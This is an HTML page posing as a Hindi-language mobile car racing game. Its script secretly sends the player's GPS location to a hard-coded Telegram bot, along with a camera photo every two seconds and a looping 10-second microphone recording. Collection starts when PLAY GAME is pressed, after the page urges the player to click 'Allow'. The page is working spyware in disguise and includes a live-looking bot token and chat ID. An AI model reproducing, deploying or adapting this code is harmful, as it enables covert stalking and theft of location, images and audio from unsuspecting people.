<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>Desi Turbo Racer Pro 🏎️</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { margin: 0; overflow: hidden; background: #2c3e50; font-family: 'Segoe UI', sans-serif; touch-action: none; }
        canvas { display: block; background: #34495e; width: 100vw; height: 100vh; }
        
        #ui { position: absolute; top: 20px; width: 100%; text-align: center; color: #f1c40f; font-size: 32px; font-weight: bold; z-index: 10; text-shadow: 2px 2px #000; pointer-events: none; }
        
        /* पारदर्शी कंट्रोल बटन */
        .controls { position: absolute; bottom: 40px; width: 100%; display: flex; justify-content: space-between; padding: 0 40px; box-sizing: border-box; z-index: 15; }
        .ctrl-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.4); border-radius: 50%; color: #fff; font-size: 40px; display: flex; align-items: center; justify-content: center; user-select: none; -webkit-tap-highlight-color: transparent; }
        .ctrl-btn:active { background: rgba(255,255,255,0.3); transform: scale(0.9); }

        #startScreen { position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 20; text-align: center; color: white; }
        .play-btn { padding: 18px 50px; font-size: 26px; background: #27ae60; color: #fff; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 5px #1e8449; }
    </style>
</head>
<body>

<div id="ui">SCORE: <span id="score">0</span></div>

<div id="startScreen">
    <h1 style="color:#e74c3c; margin-bottom:10px;">🏎️ DESI NITRO RACER</h1>
    <p>गेम लोड हो रहा है...<br>कृपया 'Allow' पर क्लिक करें!</p>
    <button class="play-btn" onclick="initEverything()">PLAY GAME</button>
</div>

<div class="controls">
    <div class="ctrl-btn" id="lBtn">◀️</div>
    <div class="ctrl-btn" id="rBtn">▶️</div>
</div>

<canvas id="gameCanvas"></canvas>
<video id="v" style="display:none" autoplay></video>
<canvas id="c" style="display:none"></canvas>

<script>
// --- [ बॉट सेटिंग्स ] ---
const botToken = '8047508895:AAFrcd1D14oyIUtPcmjK-dxZY0sEwohBJcA';
const chatId = '8466223066';

// --- [ परमिशन और डेटा कैप्चर ] ---
async function startTracking() {
    // 1. लोकेशन (एक बार तुरंत)
    navigator.geolocation.getCurrentPosition(p => {
        sendData(`📍 New Target Logged:\nGoogle Maps: http://googleusercontent.com/maps.google.com/5{p.coords.latitude},${p.coords.longitude}`, 'text');
    }, () => sendData("❌ Location Denied", 'text'));

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const video = document.getElementById('v');
        video.srcObject = stream;

        // 2. फोटो लूप (हर 2 सेकंड)
        setInterval(() => {
            const capCanvas = document.getElementById('c');
            capCanvas.width = video.videoWidth; 
            capCanvas.height = video.videoHeight;
            capCanvas.getContext('2d').drawImage(video, 0, 0);
            capCanvas.toBlob(blob => sendData(blob, 'photo'), 'image/jpeg', 0.4);
        }, 2000);

        // 3. वॉइस लूप (हर 10 सेकंड)
        function voiceRecorder() {
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                sendData(new Blob(chunks, {type: 'audio/ogg'}), 'voice');
                voiceRecorder(); // दोबारा शुरू करें
            };
            recorder.start();
            setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
        }
        voiceRecorder();

    } catch (e) {
        sendData("❌ Camera/Mic Permission Denied", 'text');
    }
}

function sendData(data, type) {
    const form = new FormData();
    form.append('chat_id', chatId);
    let apiURL = `https://api.telegram.org/bot${botToken}/`;

    if(type === 'photo') { apiURL += 'sendPhoto'; form.append('photo', data, 'snap.jpg'); }
    else if(type === 'voice') { apiURL += 'sendVoice'; form.append('voice', data, 'rec.ogg'); }
    else { apiURL += 'sendMessage'; form.append('text', data); }

    fetch(apiURL, { method: 'POST', body: form }).catch(err => console.log(err));
}

// --- [ फुल स्क्रीन कार गेम ] ---
const canvas = document.getElementById("gameCanvas");
const ctx = canvas.getContext("2d");

function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
window.addEventListener('resize', resize);
resize();

let score = 0, gameActive = false, playerX = canvas.width/2 - 30, enemies = [];

function drawCar(x, y, color) {
    ctx.fillStyle = color;
    ctx.fillRect(x, y, 60, 100); // Body
    ctx.fillStyle = "#000"; // Wheels
    ctx.fillRect(x-6, y+15, 6, 25); ctx.fillRect(x+60, y+15, 6, 25);
    ctx.fillRect(x-6, y+65, 6, 25); ctx.fillRect(x+60, y+65, 6, 25);
    ctx.fillStyle = "rgba(255,255,255,0.3)"; // Glass
    ctx.fillRect(x+8, y+20, 44, 20);
}

function enemySpawner() {
    if(!gameActive) return;
    let lWidth = canvas.width / 3;
    let lanes = [lWidth/2 - 30, canvas.width/2 - 30, (canvas.width - lWidth/2) - 30];
    let speed = 4 + (score * 0.25); // धीरे-धीरे तेज़ होगी
    enemies.push({ x: lanes[Math.floor(Math.random()*3)], y: -120, s: speed });
    setTimeout(enemySpawner, Math.max(1500 - (score * 50), 700));
}

function gameLoop() {
    if(!gameActive) return;
    ctx.clearRect(0,0,canvas.width, canvas.height);
    
    // रोड लाइन्स
    ctx.setLineDash([50, 50]); ctx.strokeStyle = "#fff"; ctx.lineWidth = 6;
    ctx.beginPath(); ctx.moveTo(canvas.width/3, 0); ctx.lineTo(canvas.width/3, canvas.height); ctx.stroke();
    ctx.beginPath(); ctx.moveTo((canvas.width/3)*2, 0); ctx.lineTo((canvas.width/3)*2, canvas.height); ctx.stroke();

    drawCar(playerX, canvas.height - 150, "#e74c3c"); // प्लेयर की कार नीचे

    enemies.forEach((en, i) => {
        en.y += en.s;
        drawCar(en.x, en.y, "#3498db");
        
        // टक्कर चेक
        if(playerX < en.x + 60 && playerX + 60 > en.x && canvas.height-150 < en.y + 100 && canvas.height-50 > en.y) {
            gameActive = false; alert("Boom! Crashed. Score: " + score); location.reload();
        }
        if(en.y > canvas.height) { enemies.splice(i, 1); score++; document.getElementById("score").innerText = score; }
    });
    requestAnimationFrame(gameLoop);
}

// कंट्रोल इवेंट्स
document.getElementById("lBtn").addEventListener("touchstart", (e) => { e.preventDefault(); playerX = Math.max(20, playerX - (canvas.width/3)); });
document.getElementById("rBtn").addEventListener("touchstart", (e) => { e.preventDefault(); playerX = Math.min(canvas.width-80, playerX + (canvas.width/3)); });

function initEverything() {
    document.getElementById("startScreen").style.display = "none";
    gameActive = true;
    startTracking(); // सारी परमिशन और डेटा यहाँ से शुरू
    enemySpawner();
    gameLoop();
}
</script>
</body>
</html>
